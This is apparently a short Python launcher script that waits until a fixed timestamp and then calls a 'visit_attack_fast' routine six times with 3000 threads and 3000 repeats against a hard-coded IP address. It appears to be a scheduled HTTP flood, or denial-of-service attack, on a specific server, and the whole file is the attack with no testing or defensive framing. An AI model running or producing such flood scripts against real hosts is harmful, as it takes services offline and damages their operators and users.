from handler import executor
import time

domain = "http://3.71.73.94/"
repeat_num = 3000
thread_num = 3000

while True:
	t = time.time()
	if t >= 1660785300:
		break

print("start!")
start = time.time()

for _ in range(6):
	executor.visit_attack_fast(domain, repeat_num=repeat_num, thread_num=thread_num)

end = time.time()
print("耗时: %s" % (end - start))
